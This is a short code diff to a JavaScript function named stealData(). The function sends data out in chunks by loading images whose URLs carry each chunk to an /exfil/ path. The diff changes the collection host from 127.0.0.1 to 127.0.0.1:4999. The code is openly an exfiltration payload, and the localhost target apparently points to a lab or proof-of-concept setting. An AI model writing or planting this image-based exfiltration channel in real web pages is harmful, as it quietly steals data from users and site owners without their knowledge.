@@ -66,7 +66,7 @@ function stealData()
 				};
 
 				// Try to async load the image, whose name is the string of data
-				downloadImage.src = "http://127.0.0.1/exfil/" + i + "/" + exfilChunk + ".jpg";
+				downloadImage.src = "http://127.0.0.1:4999/exfil/" + i + "/" + exfilChunk + ".jpg";
 			}
 
 			// Now grab that last bit
@@ -77,7 +77,7 @@ function stealData()
     			image.src = this.src;   
 			};
 
-			downloadImage.src = "http://127.0.0.1/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
+			downloadImage.src = "http://127.0.0.1:4999/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
 			console.log("Done exfiling chunks..");
 		}
 	}
